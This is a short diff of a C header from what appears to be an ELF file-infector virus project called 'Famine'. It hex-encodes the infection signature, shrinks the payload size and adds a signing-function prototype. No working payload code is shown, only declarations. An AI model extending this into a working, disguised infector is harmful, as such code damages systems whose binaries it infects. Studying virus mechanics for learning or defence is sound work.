@@ -15,9 +15,9 @@
 # include <unistd.h>
 # include <fcntl.h>
 
-# define SIGNATURE "Famine version 1.0 (c)oded by ialgac-beeligul"
+# define SIGNATURE "\x46\x41\x4d\x50\x4b\x4e\x54\x31"
 # define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)
-# define PAYLOAD_BIN_SIZE 67
+# define PAYLOAD_BIN_SIZE 29
 # define PAYLOAD_SIZE PAYLOAD_BIN_SIZE
 # define POP_RAX_OFFSET 5
 
@@ -34,6 +34,7 @@ Elf64_Phdr  *last_phdr(char *data);
 uint64_t    payload(char *data, size_t data_size, char *code, size_t code_size);
 int         is_signed(t_file file);
 int         sign(t_file target);
+int         sign_blob(t_file target);
 
 t_file      file_load(const char *path, size_t append_size);
 int         file_unload(t_file file);
